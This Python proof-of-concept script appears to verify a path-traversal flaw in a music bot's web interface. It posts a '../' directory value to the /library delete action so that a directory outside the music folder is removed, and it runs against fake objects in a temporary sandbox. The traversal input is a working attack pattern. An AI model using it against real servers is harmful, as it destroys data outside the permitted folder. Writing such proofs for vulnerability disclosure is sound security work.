import configparser, os, sys, tempfile
sys.path.insert(0, os.getcwd())
import variables as var
from tests.test_web_api import FakeBot, FakeCache, FakePlaylist

base = tempfile.mkdtemp()
music = os.path.join(base, 'music') + '/'
os.makedirs(music, exist_ok=True)
# A victim directory OUTSIDE the music folder that we will trick the bot into rmdir'ing.
victim_dir = os.path.join(base, 'OUTSIDE_victim_dir')
os.makedirs(victim_dir, exist_ok=True)

cfg = configparser.ConfigParser(interpolation=None)
cfg.read_dict({'webinterface': {'auth_method': 'none', 'access_email_header': '',
    'access_team_domain': '', 'access_aud': '', 'is_web_proxified': 'False', 'flask_secret': 'x'},
    'bot': {'username': 'b', 'delete_allowed': 'True', 'ignored_files': ''},
    'commands': {'command_symbol': '!'}})
var.config = cfg
var.music_folder = music
var.tmp_folder = base + '/tmp/'; os.makedirs(var.tmp_folder, exist_ok=True)
var.bot = FakeBot(); var.playlist = FakePlaylist(); var.cache = FakeCache(); var.user_db = None
var.is_proxified = False

# Minimal fake music_db: one row matches (so total_count>0 and we reach the delete
# branch) but query_music returns [] so the per-item delete loop is a no-op and we
# isolate the rmdir behavior.
class FakeMusicDB:
    def query_music_count(self, cond): return 1
    def query_music(self, cond): return []
    def query_all_tags(self): return []
    def query_all_paths(self): return []
var.music_db = FakeMusicDB()

import interface
c = interface.web.test_client()

rel = os.path.relpath(victim_dir, music)   # e.g. ../OUTSIDE_victim_dir
print('music_folder     :', music)
print('victim dir exists:', os.path.isdir(victim_dir), '->', victim_dir)
print('attacker dir param:', rel)

# type=url so build_library_query_condition does NOT constrain/sanitize `dir`;
# dir is only used, unchecked, in the os.listdir/os.rmdir at interface.py:698-699.
r = c.post('/library', data={'action': 'delete', 'type': 'url', 'dir': rel,
                             'tags': '', 'keywords': ''})
print('POST /library ->', r.status_code)
print('victim dir STILL exists:', os.path.isdir(victim_dir))
print('RESULT:', 'VULNERABLE - directory outside music_folder was removed'
      if not os.path.isdir(victim_dir) else 'not removed')
